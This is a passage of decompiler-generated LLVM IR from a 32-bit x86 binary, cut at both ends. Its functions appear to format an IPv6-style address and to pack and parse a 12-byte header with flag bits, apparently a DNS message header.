  store i8 58, i8* %v1_80514ee, align 1
  %v0_80514f1 = load i32, i32* @ebx, align 4
  %v1_80514f1 = add i32 %v0_80514f1, 1
  store i32 %v1_80514f1, i32* @ebx, align 4
  %v0_80514f2.pre = load i32, i32* @esi, align 4
  %v9_80514f2 = icmp eq i32 %v0_80514f2.pre, 6
  %v1_80514f5 = icmp eq i1 %v9_80514f2, false
  br i1 %v1_80514f5, label %dec_label_pc_8051546, label %dec_label_pc_80514f7

dec_label_pc_80514f7:                             ; preds = %dec_label_pc_80514f2
  %v0_80514f7 = load i32, i32* @edi, align 4
  %v1_80514f7 = icmp eq i32 %v0_80514f7, 0
  %v1_80514f9 = icmp eq i1 %v1_80514f7, false
  br i1 %v1_80514f9, label %dec_label_pc_8051546, label %dec_label_pc_80514fb

dec_label_pc_80514fb:                             ; preds = %dec_label_pc_80514f7
  %v0_80514fb = load i32, i32* @ebp, align 4
  %v9_80514fb = icmp eq i32 %v0_80514fb, 6
  br i1 %v9_80514fb, label %dec_label_pc_805150f, label %dec_label_pc_8051500

dec_label_pc_8051500:                             ; preds = %dec_label_pc_80514fb
  %v9_8051500 = icmp eq i32 %v0_80514fb, 5
  %v1_8051503 = icmp eq i1 %v9_8051500, false
  br i1 %v1_8051503, label %dec_label_pc_8051546, label %dec_label_pc_8051505

dec_label_pc_8051505:                             ; preds = %dec_label_pc_8051500
  br i1 %v1_805150d, label %dec_label_pc_8051546, label %dec_label_pc_805150f

dec_label_pc_805150f:                             ; preds = %dec_label_pc_8051505, %dec_label_pc_80514fb
  %v2_8051515 = sub i32 %v1_80514f1, %v2_80514c5
  store i32 %v2_8051515, i32* @esi, align 4
  %v2_8051520 = sub i32 46, %v2_8051515
  store i32 %v2_8051520, i32* @ecx, align 4
  %v1_8051522 = add i32 %arg2, 12
  store i32 %v1_8051522, i32* @eax, align 4
  store i32 %v1_80514f1, i32* @edx, align 4
  %v0_8051527 = load i32, i32* %stack_var_-124, align 4
  %v2_8051527 = ptrtoint i8* %stack_var_-120.159 to i32
  %v4_8051527 = call i32 @function_80512ec(i32 %v0_8051527, i32 %v2_8051527, i32 %stack_var_-116.158)
  store i32 %v4_8051527, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805152e = icmp eq i32 %v4_8051527, 0
  br i1 %v1_805152e, label %dec_label_pc_80515b8, label %dec_label_pc_8051536

dec_label_pc_8051536:                             ; preds = %dec_label_pc_805150f
  %v0_8051539 = load i32, i32* @ebx, align 4
  store i32 %v0_8051539, i32* %stack_var_-124, align 4
  %v1_805153a = inttoptr i32 %v0_8051539 to i8*
  %v2_805153a = call i32 @function_804ce94(i8* %v1_805153a)
  store i32 %v2_805153a, i32* %eax.global-to-local, align 4
  %v0_8051542 = load i32, i32* @ebx, align 4
  %v3_8051542 = add i32 %v0_8051542, %v2_805153a
  store i32 %v3_8051542, i32* @ebx, align 4
  %v0_805156a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805156a

dec_label_pc_8051546:                             ; preds = %dec_label_pc_80514f2.thread, %dec_label_pc_8051505, %dec_label_pc_8051500, %dec_label_pc_80514f7, %dec_label_pc_80514f2
  %v1_805154750 = phi i32 [ 0, %dec_label_pc_80514f2.thread ], [ %v0_80514f2.pre, %dec_label_pc_8051505 ], [ %v0_80514f2.pre, %dec_label_pc_8051500 ], [ %v0_80514f2.pre, %dec_label_pc_80514f7 ], [ %v0_80514f2.pre, %dec_label_pc_80514f2 ]
  %v0_805155049 = phi i32 [ %v0_80514ee60, %dec_label_pc_80514f2.thread ], [ %v1_80514f1, %dec_label_pc_8051505 ], [ %v1_80514f1, %dec_label_pc_8051500 ], [ %v1_80514f1, %dec_label_pc_80514f7 ], [ %v1_80514f1, %dec_label_pc_80514f2 ]
  %v0_8051546 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051546, i32* %stack_var_-112, align 4
  %v2_8051547 = mul i32 %v1_805154750, 4
  %v4_8051547 = add i32 %v3_8051547, %v2_8051547
  %v5_8051547 = inttoptr i32 %v4_8051547 to i32*
  %v6_8051547 = load i32, i32* %v5_8051547, align 4
  store i32 %v0_805155049, i32* %stack_var_-124, align 4
  %v4_8051551 = call i32 @function_804b604(i32 %v0_805155049, i32 ptrtoint ([3 x i8]* @global_var_8054611.210 to i32), i32 %v6_8051547)
  store i32 %v4_8051551, i32* %eax.global-to-local, align 4
  %v0_8051559 = load i32, i32* @ebx, align 4
  %v2_8051559 = add i32 %v0_8051559, %v4_8051551
  store i32 %v2_8051559, i32* @ebx, align 4
  br label %dec_label_pc_805155b

dec_label_pc_805155b:                             ; preds = %dec_label_pc_80514e0, %dec_label_pc_80514e4, %dec_label_pc_8051546
  %stack_var_-116.0 = phi i32 [ %v6_8051547, %dec_label_pc_8051546 ], [ %stack_var_-116.158, %dec_label_pc_80514e0 ], [ %stack_var_-116.158, %dec_label_pc_80514e4 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054611.210, i32 0, i32 0), %dec_label_pc_8051546 ], [ %stack_var_-120.159, %dec_label_pc_80514e0 ], [ %stack_var_-120.159, %dec_label_pc_80514e4 ]
  %v0_80514e418 = phi i32 [ %v2_8051559, %dec_label_pc_8051546 ], [ %v0_80514ee60, %dec_label_pc_80514e0 ], [ %v1_80514e7, %dec_label_pc_80514e4 ]
  %v0_805155b = load i32, i32* @esi, align 4
  %v1_805155b = add i32 %v0_805155b, 1
  %v0_8051565.pre = load i32, i32* @edi, align 4
  store i32 %v1_805155b, i32* @esi, align 4
  %v7_805155f = icmp sgt i32 %v1_805155b, 7
  %v10_8051565 = icmp eq i32 %v0_8051565.pre, -1
  br i1 %v7_805155f, label %dec_label_pc_8051565, label %dec_label_pc_80514d0

dec_label_pc_8051565:                             ; preds = %dec_label_pc_805155b
  br i1 %v10_8051565, label %dec_label_pc_8051576, label %dec_label_pc_805156a

dec_label_pc_805156a:                             ; preds = %dec_label_pc_8051565, %dec_label_pc_8051536
  %v0_8051572 = phi i32 [ %v0_80514e418, %dec_label_pc_8051565 ], [ %v3_8051542, %dec_label_pc_8051536 ]
  %v0_805156a = phi i32 [ %v0_8051565.pre, %dec_label_pc_8051565 ], [ %v0_805156a.pre, %dec_label_pc_8051536 ]
  %v1_805156a = load i32, i32* @ebp, align 4
  %v2_805156a = add i32 %v1_805156a, %v0_805156a
  store i32 %v2_805156a, i32* %eax.global-to-local, align 4
  %v9_805156d = icmp eq i32 %v2_805156a, 8
  %v1_8051570 = icmp eq i1 %v9_805156d, false
  br i1 %v1_8051570, label %dec_label_pc_8051576, label %dec_label_pc_8051572

dec_label_pc_8051572:                             ; preds = %dec_label_pc_805156a
  %v1_8051572 = inttoptr i32 %v0_8051572 to i8*
  store i8 58, i8* %v1_8051572, align 1
  %v0_8051575 = load i32, i32* @ebx, align 4
  %v1_8051575 = add i32 %v0_8051575, 1
  store i32 %v1_8051575, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051576

dec_label_pc_8051576:                             ; preds = %dec_label_pc_805156a, %dec_label_pc_8051565, %dec_label_pc_8051572
  %v0_805157a = phi i32 [ %v0_8051572, %dec_label_pc_805156a ], [ %v0_80514e418, %dec_label_pc_8051565 ], [ %v1_8051575, %dec_label_pc_8051572 ]
  store i32 %v2_80514c5, i32* %edx.global-to-local, align 4
  %v1_805157a = add i32 %v0_805157a, 1
  store i32 %v1_805157a, i32* %eax.global-to-local, align 4
  %v1_805157d = inttoptr i32 %v0_805157a to i8*
  store i8 0, i8* %v1_805157d, align 1
  %v0_8051580 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051580 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051580 = sub i32 %v0_8051580, %v1_8051580
  store i32 %v2_8051580, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_8051580, %arg4
  br i1 %tmp74, label %dec_label_pc_8051588, label %dec_label_pc_8051595

dec_label_pc_8051588:                             ; preds = %dec_label_pc_8051576
  %v0_8051588 = load i32, i32* %stack_var_-124, align 4
  %v1_8051588 = call i32 @function_804b4bc(i32 %v0_8051588)
  store i32 %v1_8051588, i32* %eax.global-to-local, align 4
  %v1_805158d = inttoptr i32 %v1_8051588 to i32*
  store i32 28, i32* %v1_805158d, align 4
  br label %dec_label_pc_80515b6

dec_label_pc_8051595:                             ; preds = %dec_label_pc_8051576
  %v0_8051595 = load i32, i32* @edi, align 4
  store i32 %v0_8051595, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_805159f = inttoptr i32 %arg3 to i8*
  %v4_805159f = call i32 @function_804ce78(i8* %v3_805159f, i32 %v2_80514c5)
  store i32 %v4_805159f, i32* %eax.global-to-local, align 4
  store i32 %v4_805159f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515b8

dec_label_pc_80515ab:                             ; preds = %dec_label_pc_8051404
  %v1_80515ab = call i32 @function_804b4bc(i32 %v0_80513f7)
  store i32 %v1_80515ab, i32* %eax.global-to-local, align 4
  %v1_80515b0 = inttoptr i32 %v1_80515ab to i32*
  store i32 97, i32* %v1_80515b0, align 4
  br label %dec_label_pc_80515b6

dec_label_pc_80515b6:                             ; preds = %dec_label_pc_8051588, %dec_label_pc_80515ab
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80515b8

dec_label_pc_80515b8:                             ; preds = %dec_label_pc_805150f, %dec_label_pc_8051595, %dec_label_pc_805140f, %dec_label_pc_80515b6
  %v0_80515bb = phi i32 [ 0, %dec_label_pc_805150f ], [ %v4_805159f, %dec_label_pc_8051595 ], [ %v3_805141b, %dec_label_pc_805140f ], [ 0, %dec_label_pc_80515b6 ]
  store i32 %v0_80515bb, i32* %eax.global-to-local, align 4
  store i32 %v0_80513f7, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80515bb

; uselistorder directives
  uselistorder i32 %v0_80515bb, { 1, 0 }
  uselistorder i32 %v0_805157a, { 1, 0 }
  uselistorder i32 %v1_805155b, { 1, 0, 2 }
  uselistorder i32 %v0_805155049, { 1, 0 }
  uselistorder i32 %v0_80514f2.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80514f1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.158, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.159, { 2, 1, 0 }
  uselistorder i32 %v0_80514ee60, { 2, 3, 1, 0 }
  uselistorder i32 %v1_80514e061, { 2, 0, 1 }
  uselistorder i32 %v0_80514ea62, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80514c5, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80514bd, { 1, 0 }
  uselistorder i32 %v0_80514bd, { 1, 2, 0 }
  uselistorder i32 %v1_80514a0, { 0, 2, 1 }
  uselistorder i32 %v0_80514908, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805149b12, { 0, 2, 1, 3 }
  uselistorder i1 %v10_805148b, { 1, 0 }
  uselistorder i32 %v0_80514b664, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80514ab65, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80514a067, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805145b68, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80513f7, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_804ce78, { 0, 3, 1, 2, 4, 5 }
  uselistorder [3 x i8]* @global_var_8054611.210, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 1, 0, 3, 2 }
  uselistorder i32 64, { 5, 2, 0, 3, 4, 6, 1 }
  uselistorder i32* @esp, { 0, 1, 30, 31, 32, 33, 34, 35, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 15, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 11, 92, 93, 94, 12, 95, 9, 96, 97, 98, 99, 100, 101, 13, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 10, 115, 116, 117, 118, 119, 120, 14, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 155, 2, 3, 194, 4, 5, 16, 156, 157, 158, 159, 17, 160, 161, 162, 163, 164, 19, 165, 166, 167, 21, 168, 22, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 20, 181, 23, 182, 183, 184, 24, 185, 186, 187, 188, 189, 190, 191, 192, 18, 193, 41, 8, 36, 27, 37, 38, 26, 39, 40, 42, 43, 44, 45, 6, 46, 47, 48, 49, 25, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 28, 152, 7, 153, 154, 29 }
  uselistorder i32 15, { 0, 1, 3, 2 }
  uselistorder i32 60, { 7, 8, 4, 9, 10, 6, 0, 1, 3, 2, 5 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 15, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_804ce60, { 6, 3, 4, 5, 8, 12, 10, 11, 9, 0, 1, 2, 7 }
  uselistorder i32 (i32, i32, i32)* @function_80512ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80515b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80515b6, { 1, 0 }
  uselistorder label %dec_label_pc_8051576, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805155b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051546, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80514d0, { 1, 0 }
  uselistorder label %dec_label_pc_80514c5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514b8, { 1, 0 }
  uselistorder label %dec_label_pc_80514b4, { 1, 0 }
  uselistorder label %dec_label_pc_80514a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805149d, { 1, 0 }
  uselistorder label %dec_label_pc_8051473, { 1, 0 }
}

define i32 @function_80515c4() local_unnamed_addr {
dec_label_pc_80515c4:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80515c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80515c5, i32* %stack_var_-8, align 4
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  %v4_80515cd = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80515cd, i32* %esi.global-to-local, align 4
  %v7_80515d6 = icmp sgt i32 %tmp, 11
  br i1 %v7_80515d6, label %dec_label_pc_80515dc, label %dec_label_pc_8051672

dec_label_pc_80515dc:                             ; preds = %dec_label_pc_80515c4
  %v1_80515dc = add i32 %tmp6, 1
  %v2_80515dc = inttoptr i32 %v1_80515dc to i8*
  %v3_80515dc = load i8, i8* %v2_80515dc, align 1
  store i8 %v3_80515dc, i8* %tmp5, align 1
  %v0_80515e2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515e2 = inttoptr i32 %v0_80515e2 to i32*
  %v2_80515e2 = load i32, i32* %v1_80515e2, align 4
  %v1_80515e4 = trunc i32 %v2_80515e2 to i8
  %v2_80515e4 = load i32, i32* %esi.global-to-local, align 4
  %v3_80515e4 = add i32 %v2_80515e4, 1
  %v4_80515e4 = inttoptr i32 %v3_80515e4 to i8*
  store i8 %v1_80515e4, i8* %v4_80515e4, align 1
  %v0_805160a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805160a = add i32 %v0_805160a, 8
  %v2_805160a = inttoptr i32 %v1_805160a to i32*
  %v3_805160a = load i32, i32* %v2_805160a, align 4
  %v1_805160d = mul i32 %v3_805160a, 8
  %v2_8051613 = or i32 %v1_805160d, 4
  %v1_8051615 = add i32 %v0_805160a, 20
  %v2_8051615 = inttoptr i32 %v1_8051615 to i32*
  %v3_8051615 = load i32, i32* %v2_8051615, align 4
  %v4_8051615 = icmp eq i32 %v3_8051615, 0
  %v1_8051619 = icmp eq i1 %v4_8051615, false
  %v2_8051619 = zext i1 %v1_8051619 to i32
  %v2_805161c = or i32 %v2_8051619, %v2_8051613
  %v2_805161e = or i32 %v2_805161c, -126
  %v5_805161e = trunc i32 %v2_805161e to i8
  store i32 %v2_805161e, i32* @ecx, align 4
  %v2_8051620 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051620 = add i32 %v2_8051620, 2
  %v4_8051620 = inttoptr i32 %v3_8051620 to i8*
  store i8 %v5_805161e, i8* %v4_8051620, align 1
  %v0_8051623 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051629 = add i32 %v0_8051623, 28
  %v2_8051629 = inttoptr i32 %v1_8051629 to i8*
  %v3_8051629 = load i8, i8* %v2_8051629, align 1
  %tmp10 = urem i8 %v3_8051629, 16
  %v2_8051634 = or i8 %tmp10, -128
  %v2_8051636 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051636 = add i32 %v2_8051636, 3
  %v4_8051636 = inttoptr i32 %v3_8051636 to i8*
  store i8 %v2_8051634, i8* %v4_8051636, align 1
  %v0_8051639 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051639 = add i32 %v0_8051639, 33
  %v2_8051639 = inttoptr i32 %v1_8051639 to i8*
  %v3_8051639 = load i8, i8* %v2_8051639, align 1
  %v2_805163d = load i32, i32* %esi.global-to-local, align 4
  %v3_805163d = add i32 %v2_805163d, 4
  %v4_805163d = inttoptr i32 %v3_805163d to i8*
  store i8 %v3_8051639, i8* %v4_805163d, align 1
  %v0_8051640 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051640 = add i32 %v0_8051640, 32
  %v2_8051640 = inttoptr i32 %v1_8051640 to i32*
  %v3_8051640 = load i32, i32* %v2_8051640, align 4
  %v1_8051643 = trunc i32 %v3_8051640 to i8
  %v2_8051643 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051643 = add i32 %v2_8051643, 5
  %v4_8051643 = inttoptr i32 %v3_8051643 to i8*
  store i8 %v1_8051643, i8* %v4_8051643, align 1
  %v0_8051646 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051646 = add i32 %v0_8051646, 37
  %v2_8051646 = inttoptr i32 %v1_8051646 to i8*
  %v3_8051646 = load i8, i8* %v2_8051646, align 1
  %v2_805164a = load i32, i32* %esi.global-to-local, align 4
  %v3_805164a = add i32 %v2_805164a, 6
  %v4_805164a = inttoptr i32 %v3_805164a to i8*
  store i8 %v3_8051646, i8* %v4_805164a, align 1
  %v0_805164d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805164d = add i32 %v0_805164d, 36
  %v2_805164d = inttoptr i32 %v1_805164d to i32*
  %v3_805164d = load i32, i32* %v2_805164d, align 4
  %v1_8051650 = trunc i32 %v3_805164d to i8
  %v2_8051650 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051650 = add i32 %v2_8051650, 7
  %v4_8051650 = inttoptr i32 %v3_8051650 to i8*
  store i8 %v1_8051650, i8* %v4_8051650, align 1
  %v0_8051653 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051653 = add i32 %v0_8051653, 41
  %v2_8051653 = inttoptr i32 %v1_8051653 to i8*
  %v3_8051653 = load i8, i8* %v2_8051653, align 1
  %v2_8051657 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051657 = add i32 %v2_8051657, 8
  %v4_8051657 = inttoptr i32 %v3_8051657 to i8*
  store i8 %v3_8051653, i8* %v4_8051657, align 1
  %v0_805165a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805165a = add i32 %v0_805165a, 40
  %v2_805165a = inttoptr i32 %v1_805165a to i32*
  %v3_805165a = load i32, i32* %v2_805165a, align 4
  %v1_805165d = trunc i32 %v3_805165a to i8
  %v2_805165d = load i32, i32* %esi.global-to-local, align 4
  %v3_805165d = add i32 %v2_805165d, 9
  %v4_805165d = inttoptr i32 %v3_805165d to i8*
  store i8 %v1_805165d, i8* %v4_805165d, align 1
  %v0_8051660 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051660 = add i32 %v0_8051660, 45
  %v2_8051660 = inttoptr i32 %v1_8051660 to i8*
  %v3_8051660 = load i8, i8* %v2_8051660, align 1
  %v2_8051664 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051664 = add i32 %v2_8051664, 10
  %v4_8051664 = inttoptr i32 %v3_8051664 to i8*
  store i8 %v3_8051660, i8* %v4_8051664, align 1
  %v0_8051667 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051667 = add i32 %v0_8051667, 44
  %v2_8051667 = inttoptr i32 %v1_8051667 to i32*
  %v3_8051667 = load i32, i32* %v2_8051667, align 4
  %v1_805166a = trunc i32 %v3_8051667 to i8
  %v2_805166a = load i32, i32* %esi.global-to-local, align 4
  %v3_805166a = add i32 %v2_805166a, 11
  %v4_805166a = inttoptr i32 %v3_805166a to i8*
  store i8 %v1_805166a, i8* %v4_805166a, align 1
  %v2_8051672.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051672

dec_label_pc_8051672:                             ; preds = %dec_label_pc_80515c4, %dec_label_pc_80515dc
  %v2_8051672 = phi i32 [ %v0_80515c5, %dec_label_pc_80515c4 ], [ %v2_8051672.pre, %dec_label_pc_80515dc ]
  %v0_8051674 = phi i32 [ -1, %dec_label_pc_80515c4 ], [ 12, %dec_label_pc_80515dc ]
  store i32 %v2_8051672, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051674

; uselistorder directives
  uselistorder i32 45, { 3, 1, 4, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 0, 2 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051672, { 1, 0 }
}

define i32 @function_8051678() local_unnamed_addr {
dec_label_pc_8051678:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051678 = load i32, i32* @ebx, align 4
  store i32 %v0_8051678, i32* %stack_var_-4, align 4
  %v4_8051679 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8051679, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8051681 = load i8, i8* %tmp2, align 1
  %v3_8051681 = zext i8 %v2_8051681 to i32
  %v1_8051684 = add i32 %v4_8051679, 1
  %v2_8051684 = inttoptr i32 %v1_8051684 to i8*
  %v3_8051684 = load i8, i8* %v2_8051684, align 1
  %v4_8051684 = zext i8 %v3_8051684 to i32
  %v2_8051688 = mul nuw nsw i32 %v3_8051681, 256
  %v2_805168b = or i32 %v4_8051684, %v2_8051688
  %v2_805168d = inttoptr i32 %tmp to i32*
  store i32 %v2_805168b, i32* %v2_805168d, align 4
  %v0_805168f = load i32, i32* @ecx, align 4
  %v1_805168f = add i32 %v0_805168f, 2
  %v2_805168f = inttoptr i32 %v1_805168f to i8*
  %v3_805168f = load i8, i8* %v2_805168f, align 1
  %tmp6 = icmp slt i8 %v3_805168f, 0
  %v2_8051693 = zext i1 %tmp6 to i32
  %v1_8051696 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051696 = add i32 %v1_8051696, 4
  %v3_8051696 = inttoptr i32 %v2_8051696 to i32*
  store i32 %v2_8051693, i32* %v3_8051696, align 4
  %v0_8051699 = load i32, i32* @ecx, align 4
  %v1_8051699 = add i32 %v0_8051699, 2
  %v2_8051699 = inttoptr i32 %v1_8051699 to i8*
  %v3_8051699 = load i8, i8* %v2_8051699, align 1
  %v3_805169c = udiv i8 %v3_8051699, 8
  %tmp7 = urem i8 %v3_805169c, 16
  %v1_805169f = zext i8 %tmp7 to i32
  %v1_80516a2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516a2 = add i32 %v1_80516a2, 8
  %v3_80516a2 = inttoptr i32 %v2_80516a2 to i32*
  store i32 %v1_805169f, i32* %v3_80516a2, align 4
  %v0_80516a5 = load i32, i32* @ecx, align 4
  %v1_80516a5 = add i32 %v0_80516a5, 2
  %v2_80516a5 = inttoptr i32 %v1_80516a5 to i8*
  %v3_80516a5 = load i8, i8* %v2_80516a5, align 1
  %div = udiv i8 %v3_80516a5, 4
  %tmp8 = urem i8 %div, 2
  %v1_80516ac = zext i8 %tmp8 to i32
  %v1_80516af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516af = add i32 %v1_80516af, 12
  %v3_80516af = inttoptr i32 %v2_80516af to i32*
  store i32 %v1_80516ac, i32* %v3_80516af, align 4
  %v0_80516b2 = load i32, i32* @ecx, align 4
  %v1_80516b2 = add i32 %v0_80516b2, 2
  %v2_80516b2 = inttoptr i32 %v1_80516b2 to i8*
  %v3_80516b2 = load i8, i8* %v2_80516b2, align 1
  %div5 = udiv i8 %v3_80516b2, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80516b8 = zext i8 %tmp9 to i32
  %v1_80516bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516bb = add i32 %v1_80516bb, 16
  %v3_80516bb = inttoptr i32 %v2_80516bb to i32*
  store i32 %v1_80516b8, i32* %v3_80516bb, align 4
  %v0_80516be = load i32, i32* @ecx, align 4
  %v1_80516be = add i32 %v0_80516be, 2
  %v2_80516be = inttoptr i32 %v1_80516be to i8*
  %v3_80516be = load i8, i8* %v2_80516be, align 1
  %tmp10 = urem i8 %v3_80516be, 2
  %v1_80516c2 = zext i8 %tmp10 to i32
  %v1_80516c5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516c5 = add i32 %v1_80516c5, 20
  %v3_80516c5 = inttoptr i32 %v2_80516c5 to i32*
  store i32 %v1_80516c2, i32* %v3_80516c5, align 4
  %v0_80516c8 = load i32, i32* @ecx, align 4
  %v1_80516c8 = add i32 %v0_80516c8, 3
  %v2_80516c8 = inttoptr i32 %v1_80516c8 to i8*
  %v3_80516c8 = load i8, i8* %v2_80516c8, align 1
  %tmp11 = icmp slt i8 %v3_80516c8, 0
  %v2_80516cc = zext i1 %tmp11 to i32
  %v1_80516cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516cf = add i32 %v1_80516cf, 24
  %v3_80516cf = inttoptr i32 %v2_80516cf to i32*
  store i32 %v2_80516cc, i32* %v3_80516cf, align 4
  %v0_80516d2 = load i32, i32* @ecx, align 4
  %v1_80516d2 = add i32 %v0_80516d2, 3
  %v2_80516d2 = inttoptr i32 %v1_80516d2 to i8*
  %v3_80516d2 = load i8, i8* %v2_80516d2, align 1
  %tmp12 = urem i8 %v3_80516d2, 16
  %v1_80516d6 = zext i8 %tmp12 to i32
  %v1_80516d9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516d9 = add i32 %v1_80516d9, 28
  %v3_80516d9 = inttoptr i32 %v2_80516d9 to i32*
  store i32 %v1_80516d6, i32* %v3_80516d9, align 4
  %v0_80516dc = load i32, i32* @ecx, align 4
  %v1_80516dc = add i32 %v0_80516dc, 4
  %v2_80516dc = inttoptr i32 %v1_80516dc to i8*
  %v3_80516dc = load i8, i8* %v2_80516dc, align 1
  %v4_80516dc = zext i8 %v3_80516dc to i32
  %v1_80516e0 = add i32 %v0_80516dc, 5
  %v2_80516e0 = inttoptr i32 %v1_80516e0 to i8*
  %v3_80516e0 = load i8, i8* %v2_80516e0, align 1
  %v4_80516e0 = zext i8 %v3_80516e0 to i32
  %v2_80516e4 = mul nuw nsw i32 %v4_80516dc, 256
  %v2_80516e7 = or i32 %v4_80516e0, %v2_80516e4
  %v1_80516e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516e9 = add i32 %v1_80516e9, 32
  %v3_80516e9 = inttoptr i32 %v2_80516e9 to i32*
  store i32 %v2_80516e7, i32* %v3_80516e9, align 4
  %v0_80516ec = load i32, i32* @ecx, align 4
  %v1_80516ec = add i32 %v0_80516ec, 6
  %v2_80516ec = inttoptr i32 %v1_80516ec to i8*
  %v3_80516ec = load i8, i8* %v2_80516ec, align 1
  %v4_80516ec = zext i8 %v3_80516ec to i32
  %v1_80516f0 = add i32 %v0_80516ec, 7
  %v2_80516f0 = inttoptr i32 %v1_80516f0 to i8*
  %v3_80516f0 = load i8, i8* %v2_80516f0, align 1
  %v4_80516f0 = zext i8 %v3_80516f0 to i32
  %v2_80516f4 = mul nuw nsw i32 %v4_80516ec, 256
  %v2_80516f7 = or i32 %v4_80516f0, %v2_80516f4
  %v1_80516f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80516f9 = add i32 %v1_80516f9, 36
  %v3_80516f9 = inttoptr i32 %v2_80516f9 to i32*
  store i32 %v2_80516f7, i32* %v3_80516f9, align 4
  %v0_80516fc = load i32, i32* @ecx, align 4
  %v1_80516fc = add i32 %v0_80516fc, 8
